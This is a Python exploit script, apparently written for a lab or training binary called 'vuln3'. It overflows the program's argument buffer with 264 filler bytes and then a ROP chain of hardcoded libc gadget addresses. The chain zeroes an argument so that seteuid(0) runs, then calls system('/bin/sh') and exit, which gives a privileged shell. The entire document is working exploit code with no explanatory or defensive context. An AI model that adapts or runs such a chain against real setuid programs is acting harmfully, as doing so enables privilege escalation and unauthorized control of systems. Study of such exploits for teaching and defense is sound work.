#!/usr/bin/env python
import struct
import subprocess

libc = 0xb7c00000
addr_buffer = 0xbfffee44 + 276
value_junk = 0xffffffff
addr_system = libc + 0x4c800 + 11  #system()
addr_exit =   libc + 0x3bc90       #exit
addr_arg =    libc + 0x1b5faa      #"/bin/sh"
addr_seteuid = libc + 0x118410     #seteuid

addr_01 = libc + 0x00127ce1     # pop eax ; ret
addr_02 = libc + 0x00081617     # mov dword ptr [eax + 8], 0 ; ret

# JUNK + SYSTEM + EXIT + SYSTEM_ARG
buf = "A" * 264
buf += struct.pack("<I",addr_01)
buf += struct.pack("<I",addr_buffer)
buf += struct.pack("<I",addr_02)
buf += struct.pack("<I",addr_seteuid)
buf += struct.pack("<I",addr_01)
buf += struct.pack("<I",value_junk)
buf += struct.pack("<I",addr_system)
buf += struct.pack("<I",addr_exit)
buf += struct.pack("<I",addr_arg)

subprocess.call(["./vuln3", buf])
#print buf
